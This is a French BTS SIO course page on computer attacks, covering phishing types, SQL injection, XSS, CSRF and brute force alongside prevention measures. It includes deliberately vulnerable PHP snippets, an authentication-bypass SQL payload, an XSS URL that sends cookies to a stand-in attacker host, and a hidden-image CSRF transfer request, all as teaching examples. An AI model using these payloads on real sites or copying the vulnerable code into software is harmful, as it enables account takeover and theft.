<style>
/* Styles modernes pour le cours Attaques et Vulnérabilités BTS SIO */
.course-header {
    background: linear-gradient(135deg, rgba(231, 76, 60, 0.1), rgba(192, 57, 43, 0.05));
    backdrop-filter: blur(20px);
    border-radius: 24px;
    padding: 3rem;
    margin: 2rem 0;
    border: 1px solid rgba(231, 76, 60, 0.2);
    text-align: center;
}

.course-title {
    font-size: 3rem;
    font-weight: 700;
    background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: 1rem;
}

.course-subtitle {
    color: #7f8c8d;
    font-size: 1.2rem;
    font-weight: 300;
    margin-bottom: 2rem;
}

.concept-section {
    background: var(--md-default-bg-color);
    border-radius: 20px;
    padding: 2rem;
    margin: 2rem 0;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
    border: 1px solid rgba(255, 255, 255, 0.2);
}

.section-title {
    font-size: 2.2rem;
    font-weight: 600;
    color: #e74c3c;
    margin-bottom: 2rem;
    text-align: center;
}

.definition-box {
    background: linear-gradient(135deg, rgba(231, 76, 60, 0.1), rgba(192, 57, 43, 0.05));
    border-left: 5px solid #e74c3c;
    border-radius: 12px;
    padding: 2rem;
    margin: 2rem 0;
    backdrop-filter: blur(10px);
}

.definition-title {
    font-size: 1.3rem;
    font-weight: 600;
    color: #e74c3c;
    margin-bottom: 1rem;
}

.definition-content {
    color: var(--md-default-fg-color);
    font-size: 1.1rem;
    line-height: 1.6;
}

.attack-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 2rem;
    margin: 2rem 0;
}

.attack-card {
    background: rgba(255, 255, 255, 0.6);
    border-radius: 15px;
    padding: 1.5rem;
    border: 1px solid rgba(255, 255, 255, 0.4);
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
    backdrop-filter: blur(5px);
}

.attack-card:hover {
    transform: translateY(-5px);
    box-shadow: 0 12px 24px rgba(231, 76, 60, 0.2);
}

.attack-icon {
    font-size: 2.5rem;
    margin-bottom: 1rem;
    text-align: center;
}

.attack-name {
    font-size: 1.2rem;
    font-weight: bold;
    color: #2c3e50;
    margin-bottom: 1rem;
    text-align: center;
}

.attack-description {
    color: #7f8c8d;
    font-size: 0.9rem;
    line-height: 1.5;
}

.highlight-fact {
    background: rgba(231, 76, 60, 0.1);
    border-left: 4px solid #e74c3c;
    padding: 1rem;
    margin: 1rem 0;
    border-radius: 8px;
    font-weight: 500;
}

.vulnerability-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 1.5rem;
    margin: 2rem 0;
}

.vulnerability-card {
    background: linear-gradient(135deg, rgba(231, 76, 60, 0.1), rgba(192, 57, 43, 0.05));
    border-radius: 15px;
    padding: 1.5rem;
    border: 1px solid rgba(231, 76, 60, 0.2);
    transition: all 0.3s ease;
}

.vulnerability-card:hover {
    transform: translateY(-3px);
    box-shadow: 0 8px 20px rgba(231, 76, 60, 0.2);
}

.code-example {
    background: #1a202c;
    color: #e2e8f0;
    padding: 1.5rem;
    border-radius: 10px;
    margin: 1.5rem 0;
    font-family: 'Courier New', monospace;
    overflow-x: auto;
    border-left: 4px solid #e74c3c;
}

.code-title {
    color: #e74c3c;
    font-weight: 700;
    margin-bottom: 1rem;
    font-size: 1rem;
}

.prevention-box {
    background: rgba(39, 174, 96, 0.1);
    border-left: 4px solid #27ae60;
    padding: 1.5rem;
    margin: 1rem 0;
    border-radius: 8px;
}

.prevention-title {
    color: #27ae60;
    font-weight: 600;
    margin-bottom: 0.5rem;
}

.severity-high { border-left-color: #e74c3c; background: rgba(231, 76, 60, 0.1); }
.severity-medium { border-left-color: #f39c12; background: rgba(243, 156, 18, 0.1); }
.severity-low { border-left-color: #27ae60; background: rgba(39, 174, 96, 0.1); }
</style>

<div class="course-header">
    <h1 class="course-title">B3.2 - Attaques et Vulnérabilités</h1>
    <p class="course-subtitle">Phishing, Injections SQL, XSS et autres menaces - BTS SIO</p>
</div>

## 🎯 Objectifs du cours

À l'issue de ce cours, vous serez capable de :
- Identifier les principales attaques informatiques
- Comprendre les mécanismes du phishing et de l'ingénierie sociale
- Analyser les vulnérabilités d'injection (SQL, XSS)
- Mettre en place des mesures de prévention adaptées

---

<div class="concept-section">
<h2 class="section-title">🎭 Ingénierie sociale et Phishing</h2>

<div class="definition-box">
<div class="definition-title">Ingénierie sociale</div>
<div class="definition-content">
Ensemble de techniques de manipulation psychologique utilisées pour obtenir des informations confidentielles ou pousser une personne à effectuer des actions compromettant la sécurité.
</div>
</div>

<h3>Types d'attaques par ingénierie sociale</h3>

<div class="attack-grid">
<div class="attack-card">
<div class="attack-icon">🎣</div>
<div class="attack-name">Phishing</div>
<div class="attack-description">
Envoi d'emails frauduleux imitant des organisations légitimes pour voler des identifiants ou installer des malwares.
</div>
</div>

<div class="attack-card">
<div class="attack-icon">🎯</div>
<div class="attack-name">Spear Phishing</div>
<div class="attack-description">
Phishing ciblé visant spécifiquement une personne ou organisation, avec des informations personnalisées.
</div>
</div>

<div class="attack-card">
<div class="attack-icon">🐋</div>
<div class="attack-name">Whaling</div>
<div class="attack-description">
Attaque ciblant spécifiquement les dirigeants d'entreprise (PDG, directeurs) pour obtenir des informations sensibles.
</div>
</div>

<div class="attack-card">
<div class="attack-icon">📞</div>
<div class="attack-name">Vishing</div>
<div class="attack-description">
Phishing vocal utilisant le téléphone pour tromper les victimes et obtenir des informations confidentielles.
</div>
</div>

<div class="attack-card">
<div class="attack-icon">💬</div>
<div class="attack-name">Smishing</div>
<div class="attack-description">
Phishing par SMS, utilisant des messages texte pour diriger vers des sites malveillants ou voler des données.
</div>
</div>

<div class="attack-card">
<div class="attack-icon">🚪</div>
<div class="attack-name">Tailgating</div>
<div class="attack-description">
Intrusion physique en suivant une personne autorisée dans un bâtiment sécurisé sans badge d'accès.
</div>
</div>
</div>

<h3>Anatomie d'une attaque de phishing</h3>

<div class="highlight-fact">
📧 <strong>Éléments typiques d'un email de phishing :</strong>
<ul>
<li><strong>Expéditeur falsifié</strong> : Imitation d'une organisation connue</li>
<li><strong>Urgence artificielle</strong> : "Votre compte sera suspendu"</li>
<li><strong>Liens malveillants</strong> : Redirection vers des sites frauduleux</li>
<li><strong>Demande d'informations</strong> : Mots de passe, numéros de carte</li>
<li><strong>Pièces jointes suspectes</strong> : Malwares déguisés</li>
</ul>
</div>

</div>

---

<div class="concept-section">
<h2 class="section-title">💉 Injections SQL</h2>

<div class="definition-box">
<div class="definition-title">Injection SQL</div>
<div class="definition-content">
Technique d'attaque consistant à injecter du code SQL malveillant dans une application web pour accéder, modifier ou supprimer des données dans la base de données.
</div>
</div>

<h3>Mécanisme d'une injection SQL</h3>

<div class="code-example">
<div class="code-title">Exemple de code vulnérable (PHP)</div>
```php
// Code vulnérable - JAMAIS faire cela !
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($connection, $query);
```
</div>

<div class="code-example">
<div class="code-title">Payload d'attaque</div>
```sql
-- L'attaquant saisit comme nom d'utilisateur :
admin' OR '1'='1' --

-- La requête devient :
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'motdepasse'

-- Résultat : Connexion réussie sans connaître le mot de passe !
```
</div>

<h3>Types d'injections SQL</h3>

<div class="vulnerability-grid">
<div class="vulnerability-card severity-high">
<h4>🔍 Union-based</h4>
<p>Utilise l'opérateur UNION pour combiner les résultats de plusieurs requêtes et extraire des données.</p>
</div>

<div class="vulnerability-card severity-high">
<h4>⏰ Time-based</h4>
<p>Exploite les délais de réponse pour extraire des informations bit par bit de la base de données.</p>
</div>

<div class="vulnerability-card severity-medium">
<h4>👁️ Boolean-based</h4>
<p>Utilise des conditions vraies/fausses pour extraire des informations de la base de données.</p>
</div>

<div class="vulnerability-card severity-high">
<h4>❌ Error-based</h4>
<p>Exploite les messages d'erreur de la base de données pour obtenir des informations sur sa structure.</p>
</div>
</div>

<div class="prevention-box">
<div class="prevention-title">🛡️ Prévention des injections SQL</div>
<ul>
<li><strong>Requêtes préparées</strong> : Utilisation de paramètres liés</li>
<li><strong>Validation des entrées</strong> : Filtrage et échappement</li>
<li><strong>Principe du moindre privilège</strong> : Comptes DB limités</li>
<li><strong>WAF</strong> : Web Application Firewall</li>
</ul>
</div>

</div>

---

<div class="concept-section">
<h2 class="section-title">🌐 Cross-Site Scripting (XSS)</h2>

<div class="definition-box">
<div class="definition-title">Cross-Site Scripting (XSS)</div>
<div class="definition-content">
Vulnérabilité permettant d'injecter du code JavaScript malveillant dans une page web, qui sera ensuite exécuté par le navigateur des autres utilisateurs.
</div>
</div>

<h3>Types d'attaques XSS</h3>

<div class="attack-grid">
<div class="attack-card">
<div class="attack-icon">🔄</div>
<div class="attack-name">XSS Réfléchi</div>
<div class="attack-description">
Le script malveillant est inclus dans une requête et renvoyé immédiatement dans la réponse. Nécessite que la victime clique sur un lien malveillant.
</div>
</div>

<div class="attack-card">
<div class="attack-icon">💾</div>
<div class="attack-name">XSS Stocké</div>
<div class="attack-description">
Le script malveillant est stocké sur le serveur (base de données, fichier) et exécuté à chaque fois qu'un utilisateur accède à la page infectée.
</div>
</div>

<div class="attack-card">
<div class="attack-icon">📱</div>
<div class="attack-name">XSS DOM</div>
<div class="attack-description">
La vulnérabilité existe dans le code JavaScript côté client qui modifie le DOM de manière non sécurisée.
</div>
</div>
</div>

<h3>Exemple d'attaque XSS</h3>

<div class="code-example">
<div class="code-title">Code vulnérable (PHP)</div>
```php
// Affichage direct de l'entrée utilisateur - DANGEREUX !
echo "Bonjour " . $_GET['nom'];
```
</div>

<div class="code-example">
<div class="code-title">URL malveillante</div>
```
http://site-vulnerable.com/page.php?nom=<script>alert('XSS!')</script>

// Ou plus dangereux :
http://site-vulnerable.com/page.php?nom=<script>document.location='http://attaquant.com/steal.php?cookie='+document.cookie</script>
```
</div>

<div class="prevention-box">
<div class="prevention-title">🛡️ Prévention des attaques XSS</div>
<ul>
<li><strong>Échappement HTML</strong> : htmlspecialchars(), htmlentities()</li>
<li><strong>Validation des entrées</strong> : Filtrage strict des données</li>
<li><strong>Content Security Policy (CSP)</strong> : Contrôle des ressources</li>
<li><strong>HttpOnly cookies</strong> : Protection contre le vol de cookies</li>
</ul>
</div>

</div>

---

<div class="concept-section">
<h2 class="section-title">🔨 Autres attaques courantes</h2>

<h3>Attaques par force brute</h3>

<div class="vulnerability-grid">
<div class="vulnerability-card severity-medium">
<h4>🔐 Brute Force HTTP</h4>
<p>Tentatives répétées de connexion avec différents mots de passe pour forcer l'authentification.</p>
</div>

<div class="vulnerability-card severity-medium">
<h4>📝 Dictionary Attack</h4>
<p>Utilisation d'une liste de mots de passe courants pour tenter de s'authentifier.</p>
</div>

<div class="vulnerability-card severity-high">
<h4>🌈 Rainbow Tables</h4>
<p>Tables précalculées de hachages pour casser rapidement les mots de passe faibles.</p>
</div>
</div>

<h3>Attaques sur les applications web</h3>

<div class="code-example">
<div class="code-title">Exemple d'attaque CSRF (Cross-Site Request Forgery)</div>
```html
<!-- Page malveillante qui force une action sur un autre site -->
<img src="http://banque.com/transfer.php?to=attaquant&amount=1000" 
     style="display:none">

<!-- L'utilisateur connecté à sa banque exécute involontairement le transfert -->
```
</div>

<div class="highlight-fact">
⚠️ <strong>Statistiques alarmantes :</strong>
<ul>
<li>43% des cyberattaques ciblent les petites entreprises</li>
<li>95% des violations de données sont dues à une erreur humaine</li>
<li>Les attaques par phishing ont augmenté de 65% en 2023</li>
<li>Le coût moyen d'une violation de données : 4,45 millions de dollars</li>
</ul>
</div>

</div>

---

<div class="concept-section">
<h2 class="section-title">🛡️ Stratégies de défense</h2>

<h3>Défense en profondeur</h3>

<div class="attack-grid">
<div class="attack-card">
<div class="attack-icon">👥</div>
<div class="attack-name">Formation utilisateurs</div>
<div class="attack-description">
Sensibilisation aux risques, reconnaissance des tentatives de phishing, bonnes pratiques de sécurité.
</div>
</div>

<div class="attack-card">
<div class="attack-icon">🔧</div>
<div class="attack-name">Mesures techniques</div>
<div class="attack-description">
Pare-feu, antivirus, filtrage des emails, mise à jour des systèmes, chiffrement des données.
</div>
</div>

<div class="attack-card">
<div class="attack-icon">📋</div>
<div class="attack-name">Politiques de sécurité</div>
<div class="attack-description">
Procédures claires, gestion des accès, politique de mots de passe, plan de réponse aux incidents.
</div>
</div>
</div>

<h3>Tests de sécurité</h3>

<div class="prevention-box">
<div class="prevention-title">🔍 Types de tests de sécurité</div>
<ul>
<li><strong>Tests de pénétration</strong> : Simulation d'attaques réelles</li>
<li><strong>Audit de code</strong> : Analyse statique et dynamique</li>
<li><strong>Scan de vulnérabilités</strong> : Détection automatisée</li>
<li><strong>Tests d'ingénierie sociale</strong> : Évaluation de la sensibilisation</li>
</ul>
</div>

</div>

---

## 📚 Ressources et outils

<div class="highlight-fact">
🔗 <strong>Outils de test et formation :</strong>
<ul>
<li><strong>OWASP WebGoat</strong> : Application volontairement vulnérable</li>
<li><strong>DVWA</strong> : Damn Vulnerable Web Application</li>
<li><strong>Metasploit</strong> : Framework de test de pénétration</li>
<li><strong>Burp Suite</strong> : Proxy d'interception pour tests web</li>
<li><strong>OWASP ZAP</strong> : Scanner de vulnérabilités gratuit</li>
</ul>
</div>

---

## ✅ Points clés à retenir

1. **Ingénierie sociale** : 95% des attaques réussies impliquent l'humain
2. **Injection SQL** : Toujours utiliser des requêtes préparées
3. **XSS** : Échapper toutes les données utilisateur affichées
4. **Défense en profondeur** : Combiner mesures techniques et humaines
5. **Formation continue** : La sensibilisation est la première ligne de défense

<div class="highlight-fact">
🎓 <strong>Prochaine étape :</strong> Dans le cours B3.3, nous explorerons la cryptographie et les techniques de chiffrement (César, Vigenère, hash, blockchain).
</div>